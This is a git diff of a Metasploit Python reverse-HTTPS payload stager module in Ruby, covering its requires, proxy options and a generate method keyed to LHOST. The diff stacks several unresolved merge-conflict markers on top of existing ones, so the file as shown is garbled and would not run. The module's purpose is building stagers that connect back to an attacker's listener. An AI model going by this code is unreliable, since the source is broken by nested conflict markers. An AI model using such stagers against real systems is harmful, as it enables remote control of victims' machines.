@@ -7,6 +7,7 @@ require 'msf/core'
 require 'msf/core/handler/reverse_https'
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 require 'msf/core/payload/python'
 require 'msf/core/payload/python/reverse_http'
 =======
@@ -19,10 +20,16 @@ require 'msf/core/payload/uuid/options'
 
 module Metasploit3
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
+=======
+require 'msf/core/payload/uuid/options'
+
+module Metasploit3
+>>>>>>> origin/msf-complex-payloads
 
   CachedSize = 762
 
   include Msf::Payload::Stager
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
   include Msf::Payload::Python
@@ -33,6 +40,9 @@ module Metasploit3
 =======
   include Msf::Payload::UUID::Options
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
+=======
+  include Msf::Payload::UUID::Options
+>>>>>>> origin/msf-complex-payloads
 
   def initialize(info = {})
     super(merge_info(info,
@@ -46,14 +56,20 @@ module Metasploit3
       'Stager'        => {'Payload' => ""}
     ))
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+>>>>>>> origin/msf-complex-payloads
 
     register_options(
       [
         OptString.new('PayloadProxyHost', [false, "The proxy server's IP address"]),
         OptPort.new('PayloadProxyPort', [true, "The proxy port to connect to", 8080 ])
       ], self.class)
+<<<<<<< HEAD
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> origin/msf-complex-payloads
   end
 
   #
@@ -61,8 +77,11 @@ module Metasploit3
   #
   def generate
 <<<<<<< HEAD
+<<<<<<< HEAD
     super({scheme: 'https'})
 =======
+=======
+>>>>>>> origin/msf-complex-payloads
     lhost = datastore['LHOST'] || '127.127.127.127'
 
     var_escape = lambda { |txt|
@@ -148,7 +167,10 @@ module Metasploit3
     end
 
     generate_uri_uuid_mode(:init_python, uri_req_len)
+<<<<<<< HEAD
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> origin/msf-complex-payloads
   end
 
 end
